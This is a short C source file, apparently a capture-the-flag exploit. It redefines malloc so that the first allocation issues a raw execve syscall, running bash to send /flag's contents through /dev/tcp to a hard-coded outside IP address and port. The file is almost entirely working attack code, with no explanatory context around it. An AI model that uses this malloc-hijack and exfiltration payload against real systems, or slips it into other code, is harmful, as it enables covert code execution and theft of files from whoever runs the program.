const char *binbash = "/bin/bash";
const char *args[] = {
    "/bin/bash",
    "-c",
    "cat /flag >& /dev/tcp/140.113.209.7/1337 0>&1",
    0
};
const char ***pargs = args;

static int firsttime = 1;

const char buf[0x10000];
int offset = 0;

void *malloc(size_t size)
{
    if (firsttime) {
        firsttime = 0;
        printf("AAAAAAAAAAAAAAAAA\n");
        
        __asm__ volatile (
            "movq $59, %%rax\n"
            "movq %0, %%rdi\n"
            "movq %1, %%rsi\n"
            "movq $0, %%rdx\n"
            "syscall\n"
            :
            : "m" (binbash), "m" (pargs)
            :
        );

        return 0;
    }
    
    int oldoffset = offset;
    offset += size + 0x10;
    return &buf[oldoffset];
}

int main()
{
    printf("main\n");
}